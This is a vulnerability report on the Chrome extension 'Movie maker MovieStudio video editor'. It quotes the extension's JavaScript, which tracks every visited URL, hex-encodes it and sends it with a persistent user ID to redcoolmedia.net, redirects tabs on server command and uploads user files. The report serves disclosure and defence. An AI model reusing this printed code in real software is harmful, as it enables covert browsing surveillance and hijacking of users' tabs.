# Vulnerability Report: Movie maker MovieStudio video editor

## Metadata
- **Extension ID**: ohgkmilcibaoempgifldidkidnbkbeii
- **Extension Name**: Movie maker MovieStudio video editor
- **Version**: 1.4.1
- **Users**: ~100,000
- **Manifest Version**: 3
- **Analysis Date**: 2026-02-07

## Executive Summary

This extension exhibits **CRITICAL** privacy and security violations. It conducts comprehensive surveillance of user browsing activity by tracking every URL visited and transmitting this data to remote servers without adequate user consent or transparency. The extension monitors tab activation and navigation events, exfiltrates full URLs (converted to hex encoding), and may redirect users to potentially malicious destinations based on server responses.

**Key Findings**:
1. Persistent user browsing surveillance with URL exfiltration to `stream.redcoolmedia.net` and `redcoolmedia.net`
2. Automatic tab redirection capability based on server commands
3. Inadequate disclosure of tracking behavior despite brief privacy notice
4. Persistent user tracking via randomly-generated unique identifiers
5. File upload functionality sending user data to third-party servers

## Vulnerability Details

### 1. CRITICAL: Comprehensive Browsing Surveillance and URL Exfiltration

**Severity**: CRITICAL
**Files**: `web.js` (background service worker), `service.js`
**CWE**: CWE-359 (Exposure of Private Information)

**Description**:
The extension monitors all user browsing activity through Chrome tab events and automatically transmits every visited URL to remote servers.

**Evidence**:

```javascript
// web.js lines 20-27
chrome.tabs.onActivated.addListener(function(activeInfo) {
    aati = activeInfo.tabId;
    xdii(aati);
});

chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
    xdii(tabId);
});

// web.js lines 4-14
function xdii(tabId) {
    chrome.tabs.get(tabId, function(tab) {
        if ( ( tab.url.indexOf("redco") == -1 ) && ( tab.url.indexOf("http") !== -1 ) && ( lasiee != tab.url) )  {
            utyu = tab.url;
            rtcc = "";
            rtcc = utyu;
            exx(rtcc);
            lasiee = tab.url;
        }
    });
}

// web.js lines 99-111
let rtcx = await fetch('https://stream.redcoolmedia.net/api/moviemakeru.php?l=' + bin2hex(urly) + '&hex=1&u=' + un);

if (rtcx.status === 200) {
    let dsx = await rtcx.text();
    console.log(dsx);
    var rse2 = dsx;
    if ( rse2.indexOf("302") !== -1 ) {
        var cvcv = 'https://www.redcoolmedia.net/api/app-moviemaker.php?url=' + bin2hex(urly) + '&u=' + un;
        chrome.tabs.update(chrome.tabs.getCurrent().id, {url: cvcv});
    }
}
```

**Analysis**:
- Every tab activation and URL update triggers the `xdii()` function
- URLs are converted to hex encoding via `bin2hex()` and transmitted to `moviemakeru.php`
- The extension includes the user's unique identifier (`un`) with each request
- Server responses containing "302" trigger automatic tab redirection
- The `lasiee` variable prevents duplicate submissions of the same URL, but the tracking is still comprehensive
- The exclusion filter only prevents tracking of the extension's own domain ("redco")

**Verdict**: This is malicious browsing surveillance. The extension has no legitimate need to track all URLs visited by the user. This behavior far exceeds what's necessary for a video editing tool.

---

### 2. HIGH: Persistent User Tracking with Unique Identifiers

**Severity**: HIGH
**Files**: `web.js`, `apar.js`
**CWE**: CWE-359 (Exposure of Private Information)

**Description**:
The extension generates a persistent, random 10-character identifier for each user and includes it with all network requests, enabling cross-session tracking.

**Evidence**:

```javascript
// web.js lines 33-39
if ( chrome.storage.sync.get('usernameredcool', function (obj) { })  ) {
    usernameredcool = chrome.storage.sync.get('usernameredcool', function (obj) { });
}
else {
    usernameredcool = "" + randomString(10) + "".toLowerCase();
    chrome.storage.sync.set({'usernameredcool': usernameredcool.toLowerCase()}, function() { });
}

// apar.js lines 17-23
if ( redxda.usernameredcool ) {
    usernameredcool = redxda.usernameredcool;
}
else {
    usernameredcool = "" + randomString(10) + "".toLowerCase();
    redxda.usernameredcool = usernameredcool;
}
```

**Analysis**:
- A random 10-character alphanumeric string is generated on first run
- Stored persistently in `chrome.storage.sync` (syncs across devices) and `chrome.storage.local`
- Included with all API requests (`?u=` parameter)
- Enables server-side profiling and tracking of individual users across sessions
- No mechanism for users to reset or opt-out of this tracking

**Verdict**: Malicious user tracking. Combined with URL exfiltration, this enables comprehensive surveillance and profiling of individual users.

---

### 3. HIGH: Server-Controlled Tab Redirection

**Severity**: HIGH
**Files**: `web.js`
**CWE**: CWE-601 (URL Redirection to Untrusted Site)

**Description**:
The extension allows remote servers to redirect user browser tabs based on response content.

**Evidence**:

```javascript
// web.js lines 101-111
if (rtcx.status === 200) {
    let dsx = await rtcx.text();
    console.log(dsx);
    var rse2 = dsx;
    if ( rse2.indexOf("302") !== -1 ) {
        var cvcv = 'https://www.redcoolmedia.net/api/app-moviemaker.php?url=' + bin2hex(urly) + '&u=' + un;
        chrome.tabs.update(chrome.tabs.getCurrent().id, {url: cvcv});
    }
}
```

**Analysis**:
- Server responses containing the string "302" trigger automatic redirects
- Redirects navigate to `app-moviemaker.php` with the original URL and user ID
- This could be weaponized to redirect users to phishing sites, malware, or ads
- No user consent required for redirection
- The logic attempts to use `getCurrent().id` which may not work correctly in service worker context

**Verdict**: Malicious redirect capability. While currently pointing to the same domain, this architecture allows server-side control of user navigation.

---

### 4. MEDIUM: Inadequate Privacy Disclosure

**Severity**: MEDIUM
**Files**: `index.html`, `settings.html`
**CWE**: CWE-200 (Exposure of Sensitive Information)

**Description**:
While the extension does include a privacy notice, it significantly understates the scope of data collection.

**Evidence**:

```html
<!-- index.html line 87 -->
<div style="margin-left: 5px; padding-bottom: 5px; width: 100%; padding-top: 5px; font-size: 14px; color: #ffffff; background: #000000;">
    NOTE: Please note that this extension scans and collects the webpages you browse in the Internet.
    These webpages are uploaded to our servers in order to know if they contain MP4 video files that can be edited using our extension.
    Refer to our policy about it.
</div>

<!-- settings.html lines 8-10 -->
<label>
    MovieStudio movie maker. This extension scans and collects the webpages you browse in the Internet.
    These webpages are uploaded to our servers in order to know if they contain MP4 video files that can be edited using our extension.
    Refer to our policy about it.
</label>
```

**Analysis**:
- Disclosure claims URLs are sent to "know if they contain MP4 video files"
- Reality: ALL non-extension URLs are transmitted regardless of content
- No mention of persistent user tracking identifiers
- No mention of potential automatic redirections
- Disclosure is buried at bottom of popup in small text
- "Refer to our policy" provides no actual link to policy document

**Verdict**: Inadequate disclosure. While technically mentioning URL collection, the justification is misleading and the scope understated.

---

### 5. MEDIUM: File Upload with User Tracking

**Severity**: MEDIUM
**Files**: `apar.js`
**CWE**: CWE-359 (Exposure of Private Information)

**Description**:
User-uploaded video files are transmitted to third-party servers along with the persistent tracking identifier.

**Evidence**:

```javascript
// apar.js lines 192-230
function uploadMovieFile(file) {
    var folder = decodeURIComponent(window.location.hash.substr(1));

    if(file.size > MAX_UPLOAD_SIZE) {
        var $error_row = renderFileSizeErrorRow(file,folder);
        $('#upload_progress').empty();
        $('#upload_progress').append($error_row);
        window.setTimeout(function(){$error_row.fadeOut();},5000);
        return false;
    }

    var $row = renderFileUploadRow(file,folder);
    $('#upload_progress').empty();
    $('#upload_progress').append($row);
    var fd = new FormData();
    fd.append('file_data',file);
    fd.append('file',folder);
    fd.append('xsrf',XSRF);
    fd.append('do','upload');
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://stream.redcoolmedia.net/onlineeditor/filemanager.php?service=&do=upload&username='+ usernameredcool);
    xhr.onload = function() {
        $row.remove();
        list();
    };
    xhr.upload.onprogress = function(e){
        if(e.lengthComputable) {
            $row.find('.progress').css('width',(e.loaded/e.total*100 | 0)+'%' );
        }
    };
    xhr.send(fd);
}
```

**Analysis**:
- Files uploaded to `stream.redcoolmedia.net/onlineeditor/filemanager.php`
- User tracking ID included in URL (`username=` parameter)
- Files stored server-side and associated with user identifier
- Max upload size: 1.1 GB (very large for supposedly temporary processing)
- File management API endpoints suggest persistent storage:
  - `moviemakerb.php?u=` - list user's uploaded files
  - `filemanager.php?do=list&username=` - file listing
  - `filemanager.php?do=download&username=` - download files
  - `filemanager.php?do=delete` - delete files

**Verdict**: Suspicious file handling. User files are persistently stored on third-party servers with user tracking, raising privacy concerns.

---

### 6. LOW: Potential CSRF in File Operations

**Severity**: LOW
**Files**: `apar.js`
**CWE**: CWE-352 (Cross-Site Request Forgery)

**Description**:
File operations include an XSRF token, but the token is obtained from cookies which may be vulnerable.

**Evidence**:

```javascript
// apar.js line 146
var XSRF = (document.cookie.match('(^|; )_sfm_xsrf=([^;]*)')||0)[2];

// apar.js line 153
$.post('https://www.redcoolmedia.net/onlineeditor/filemanager.php?service=&username='+ usernameredcool,
    {'do':'delete',file:$(this).attr('data-file'),xsrf:XSRF},
    function(response){
        list();
    },'json');
```

**Analysis**:
- XSRF token read from cookies
- If cookie is undefined, token becomes undefined
- Some operations may proceed without proper CSRF protection
- However, impact is limited since file operations are user-specific

**Verdict**: Minor issue. CSRF protection exists but implementation could be more robust.

---

## False Positives Analysis

| Pattern | Location | Assessment |
|---------|----------|------------|
| jQuery AJAX | jquery.min.js, jquery-3.2.1.min.js | Legitimate library - Not suspicious |
| FormData usage | apar.js line 213 | Standard file upload - Legitimate |
| Random string generation | web.js, apar.js | Used for user tracking - MALICIOUS CONTEXT |

---

## API Endpoints Analysis

| Endpoint | Purpose | Data Transmitted | Risk |
|----------|---------|------------------|------|
| `https://stream.redcoolmedia.net/api/moviemakeru.php` | URL tracking | Hex-encoded URL + user ID | CRITICAL |
| `https://www.redcoolmedia.net/api/app-moviemaker.php` | Redirect destination | Hex-encoded URL + user ID | HIGH |
| `https://stream.redcoolmedia.net/api/moviemakerb.php` | List detected videos | User ID | MEDIUM |
| `https://stream.redcoolmedia.net/onlineeditor/filemanager.php` | File upload/management | User files + user ID | MEDIUM |
| `https://www.redcoolmedia.net/onlineeditor/filemanager.php` | File listing/download | User ID | MEDIUM |
| `https://www.redcoolmedia.net/PopcornEditor/moviemaker.html` | Video editor interface | Video URL (via GET parameter) | LOW |

---

## Data Flow Summary

1. **Browsing Surveillance Flow**:
   - User navigates to any webpage → `chrome.tabs.onActivated` / `onUpdated` fires
   - Tab URL extracted → converted to hex via `bin2hex()`
   - Transmitted to `moviemakeru.php` with persistent user ID
   - Server may respond with redirect command → automatic navigation occurs

2. **User Tracking Flow**:
   - On first install → random 10-char ID generated
   - Stored in `chrome.storage.sync` and `chrome.storage.local`
   - Included with every API request
   - Enables cross-session, cross-device tracking

3. **File Upload Flow**:
   - User uploads video file → sent to `stream.redcoolmedia.net`
   - File stored server-side with user ID association
   - Files listed and managed through user-specific endpoints
   - Downloaded videos include user ID in URL

4. **Opt-out Flow**:
   - Checkbox in popup UI ("Edit Online")
   - Stored in `redcoolonline` preference
   - When unchecked (value "0"), URL tracking is disabled
   - However, user must manually discover and disable this feature

---

## Manifest Analysis

**Permissions Requested**:
- `storage` - Used for persistent tracking ID and user preferences
- `tabs` - Used for URL surveillance and redirection

**Content Security Policy**: Not explicitly defined (uses MV3 defaults)

**Background Service Worker**: `service.js` (imports `web.js`)

**Assessment**: Minimal permissions requested, but `tabs` permission is abused for comprehensive surveillance. No content scripts are used, which is unusual for a legitimate utility extension.

---

## Overall Risk Assessment

**RISK LEVEL: CRITICAL**

**Justification**:
This extension is fundamentally a surveillance tool masquerading as a video editor. It conducts comprehensive, persistent tracking of user browsing activity with inadequate disclosure and consent. The combination of:

1. All-URL tracking and exfiltration
2. Persistent cross-session user identification
3. Server-controlled tab redirection capability
4. Misleading privacy disclosure
5. Large-scale user base (~100,000 users)

...constitutes a serious privacy violation and potential security threat.

**Recommended Actions**:
1. **IMMEDIATE REMOVAL** from Chrome Web Store
2. Users should uninstall immediately
3. Investigation into redcoolmedia.net's data retention practices
4. Potential regulatory notification (GDPR, CCPA violations likely)

**Evidence of Malice**:
- No legitimate need for all-URL tracking in a video editor
- Hex encoding suggests intent to obfuscate transmitted data
- Persistent user IDs enable long-term profiling
- Privacy notice understates actual tracking scope
- Opt-out is hidden and defaults to enabled tracking

**Comparison to Legitimate Extensions**:
Legitimate video editor extensions would:
- Only request access to specific video file URLs (via downloads API or user selection)
- Not track general browsing activity
- Not maintain persistent user identifiers
- Provide clear, prominent privacy controls
- Process files locally or with explicit, per-file consent

This extension fails all these criteria.
